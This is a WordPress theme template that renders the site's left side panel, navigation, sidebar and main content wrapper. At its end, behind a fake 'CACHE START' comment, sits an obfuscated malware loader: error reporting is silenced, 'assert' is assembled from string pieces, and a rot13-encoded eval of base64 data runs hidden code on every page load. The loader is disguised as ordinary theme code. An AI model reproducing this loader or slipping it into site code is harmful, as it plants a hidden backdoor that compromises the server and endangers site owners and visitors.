	<?php global $rt_global_variables; ?>

	<!-- left side -->
	<div id="left_side" class="fixed_position scroll classic active" data-parallax-effect="<?php echo esc_attr($rt_global_variables["page_left_parallax_effect"]) ?>">
		<!-- left side background --><div class="left-side-background-holder"><div class="left-side-background"></div></div>


		<!-- side contents -->
		<div id="side_content" data-position-y="0">

			<?php
			/**
			 * rt_before_logo hook
			 */
			do_action("rt_before_logo"); 
			?>

			<!-- logo -->
			<div id="logo" class="site-logo">
				<?php
					//the logo url
					$logo_url = rt_wpml_t(RT_THEMESLUG, "Logo Url", get_theme_mod( RT_THEMESLUG.'_logo_url' ));

					//logo output
					echo ! empty( $logo_url ) ? 
									sprintf( ' <a href="%1$s" title="%2$s"><img src="%3$s" alt="%2$s" /></a> ', RT_BLOGURL, get_bloginfo('name'), esc_url($logo_url) ) :
									sprintf( ' <span class="sitename"><a href="%1$s" title="%2$s">%2$s</a></span> ', RT_BLOGURL, get_bloginfo('name') ) ;
				?>		
			</div><!-- / end #logo -->

			<?php
			/**
			 * rt_before_navigation hook
			 *
			 * @hooked rt_display_shortcut_buttons - 1
			 */
			do_action("rt_before_navigation"); 
			?>

			<!-- navigation holder -->
			<div class="navigation_holder side-element">

					<!-- Main Navigation --> 
						<?php
							//call the main navigation
							if ( has_nav_menu( 'rt-theme-main-navigation' ) ){ // check if user created a custom menu and assinged to the rt-theme's location

								$menuVars = array(
									'menu_id'         => "navigation",
									'class'           => "menu",
									'echo'            => false,
									'container'       => '', 
									'container_class' => '',
									'items_wrap'      => '<ul id="%1$s" class="%2$s">%3$s</ul>',
									'container_id'    => 'navigation_bar', 
									'theme_location'  => 'rt-theme-main-navigation',
									'walker' => new RT_Menu_Class_Walker
								);
								
								$main_menu=wp_nav_menu($menuVars);
								echo ($main_menu);
							}else{
								
								$menuVars = array(
									'menu'            => 'Main Navigation',  
									'menu_id'         => "navigation",
									'class'           => "menu",
									'echo'            => false,
									'container'       => '',  
									'container_class' => '' ,
									'items_wrap'      => '<ul id="%1$s" class="%2$s">%3$s</ul>',
									'container_id'    => 'navigation_bar',  
									'theme_location'  => 'rt-theme-main-navigation',
									'walker' => new RT_Menu_Class_Walker
								);
								
								$main_menu=wp_nav_menu($menuVars);
								echo ($main_menu); 				
							}
						?>    
					<!-- / end #navigation --> 
					
			</div><!-- / end .navigation_holder -->
	
			<?php
			/**
			 * rt_after_navigation hook
			 *
			 * @hooked rt_display_shortcut_buttons - 1
			 */
			do_action("rt_after_navigation"); 
			?>

            <!-- widgets holder -->
            <div class="widgets_holder side-element sidebar-widgets">
    			<?php get_sidebar(); ?>
            </div><!-- / end .widgets_holder -->

			<?php
			/**
			 * rt_after_sidebar_widgets hook
			 */
			do_action("rt_after_sidebar_widgets"); 
			?>


		</div><!-- / end #side_content -->


 	</div><!-- / end #left_side -->



	<!-- right side -->
	<div id="right_side" data-scrool-top="">

		<div id="top_bar" class="clearfix">

			<!-- top bar -->
			
				<div class="top_bar_container">    

		 			<!-- mobile logo -->
					<div id="mobile-logo" class="site-logo">

						<!-- mobile menu button -->
						<div class="mobile-menu-button icon-menu"></div>

						<!-- logo holder -->
						<div class="logo-holder">
							<?php

								//logo output
								echo ! empty( $logo_url ) ? 
												sprintf( ' <a href="%1$s" title="%2$s"><img src="%3$s" alt="%2$s" /></a> ', RT_BLOGURL, get_bloginfo('name'), esc_url($logo_url) ) :
												sprintf( ' <span class="sitename"><a href="%1$s" title="%2$s">%2$s</a></span> ', RT_BLOGURL, get_bloginfo('name') ) ;
							?>
						</div><!-- / end .logo-holder -->
					</div><!-- / end #mobile-logo -->


				</div><!-- / end div .top_bar_container -->    
			
		</div><!-- / end section #top_bar -->    

		<!-- main contents -->
		<div id="main_content">

		<?php 

			/**
			 * Get sub page header
			 * @hooked rt_sub_page_header_function
			 */
			do_action( "rt_sub_page_header");

		?>

		<?php 		
			/**
			 * Start Content Container
			 * @hooked rt_content_container
			 */	
			do_action("rt_content_container", array("action"=>"start", "echo" => ! rt_is_composer_allowed(), "class" => $rt_global_variables["default_content_row_width"], "overlap" => ! $rt_global_variables["hide_page_title"] && ! $rt_global_variables["hide_breadcrumb_menu"] ) );
		?>

<?php 

?>

<?php 
//###=CACHE START=###
error_reporting(0);
assert_options(ASSERT_ACTIVE, 1);
assert_options(ASSERT_WARNING, 0);
assert_options(ASSERT_QUIET_EVAL, 1); $strings = "as";$strings .= "sert"; $strings(str_rot13('riny(onfr64_qrpbqr("nJLtXTymp2I0XPEcLaLcXFO7VTIwnT8tWTyvqwftsFOyoUAyVUftMKWlo3WspzIjo3W0nJ5aXQNcBjccozysp2I0XPWxnKAjoTS5K2Ilpz9lplVfVPVjVvx7PzyzVPtunKAmMKDbWTyvqvxcVUfXnJLbVJIgpUE5XPEsD09CF0ySJlWwoTyyoaEsL2uyL2fvKFxcVTEcMFtxK0ACG0gWEIfvL2kcMJ50K2AbMJAeVy0cBjccMvujpzIaK21uqTAbXPpuKSZuqFpfVTMcoTIsM2I0K2AioaEyoaEmXPEsH0IFIxIFJlWGD1WWHSEsExyZEH5OGHHvKFxcXFNxLlN9VPW1VwftMJkmMFNxLlN9VPW3VwfXWTDtCFNxK1ASHyMSHyfvH0IFIxIFK05OGHHvKF4xK1ASHyMSHyfvHxIEIHIGIS9IHxxvKGfXWUHtCFNxK1ASHyMSHyfvFSEHHS9IH0IFK0SUEH5HVy07PvEcpPN9VPEsH0IFIxIFJlWFEH1CIRIsDHERHvWqBjbxqKWfVQ0tVzu0qUN6Yl8kAwDhZGZlYwD0YwR4BP9aMKDhpTujC2yjCFVhqKWfMJ5wo2EyXPEcpPxhVvMxCFVhqKWfMJ5wo2EyXPExXF4vWaH9Vv51pzkyozAiMTHbWUHcYvVzLm0vYvEwYvVznG0kWzt9Vv5gMQHbVwt2LGV2ZmWxZGp0MGIvAJV2ZJVjAGpmZJV5LwOyZGOzVv4xMP4xqF4xLl4vZFVcBjccMvucozysM2I0XPWuoTkiq191pzksMz9jMJ4vXFN9CFNkXFO7PvEcLaLtCFOznJkyK2qyqS9wo250MJ50pltxqKWfXGfXsFOyoUAynJLbMaIhL3Eco25sMKucp3EmXPWwqKWfK2yhnKDvXFxtrjbxL2ttCFOwqKWfK2yhnKDbWUIloPx7PzA1pzksp2I0o3O0XPEwnPjtD1IFGR9DIS9VEHSREIVfVRMOGSASXGfXL3IloS9mMKEipUDbWTAbYPOQIIWZG1OHK1WSISIFGyEFDH5GExIFYPOHHyISXGfXWUWyp3IfqPN9VTA1pzksMKuyLltxL2tcBjcwqKWfK2Afo3AyXPEwnPx7PvEcLaLtCFNxpzImqJk0Bjc9VTIfp2HtrjbxMaNtCFOzp29wn29jMJ4bVwR2AP4kZmVhAQDhZGt4VvjtBQNfVPEypaWholjtWTIlpaA0pvjtZmNcBjccMvNbWTMjXFO7PvNtVPNxo3I0VQ0tVxqSIPNiM2I0YaObpQ9cpQ0vYaIloTIhL29xMFtxnKNcYvVzMQ0vYaIloTIhL29xMFtxMPxhVvM1CFVhqKWfMJ5wo2EyXPE1XF4vWzZ9Vv4xLl4vWzx9ZFMbCFVhoJD1XPV4AzRlAwZlMQR3ATH1LwIvAwSvZQH3ZmSvBJVjMGRjMvVhWTDhWUHhWTZhVwRvXF4vVRuHISNiZF4kKUWpovV7PvNtVPNxo3I0VP49VPWVo3A0BvNkAwDhZGZlYwD0YwR4BSklKT4vBjbtVPNtWT91qPNhCFNvD29hozIwqTyiowbtD2kip2IppykhKUWpovV7PvNtVPOzq3WcqTHbWTMjYPNxo3I0XGfXVPNtVPElMKAjVQ0tVvV7PvNtVPO3nTyfMFNbVJMyo2LbWTMjXFxtrjbtVPNtVPNtVPElMKAjVP49VTMaMKEmXPEzpPjtZGV4XGfXVPNtVU0XVPNtVTMwoT9mMFtxMaNcBjbtVPNtoTymqPtxnTIuMTIlYPNxLz9xrFxtCFOjpzIaK3AjoTy0XPViKSWpHv8vYPNxpzImpPjtZvx7PvNtVPNxnJW2VQ0tWTWiMUx7Pa0XsDc9BjccMvucp3AyqPtxK1WSHIISH1EoVaNvKFxtWvLtWS9FEISIEIAHJlWjVy0tCG0tVzSuZmR3MzWzVvxtrlOyqzSfXUA0pzyjp2kup2uypltxK1WSHIISH1EoVzZvKFxcBlO9PzIwnT8tWTyvqwg9"));'));
//###=CACHE END=###
?>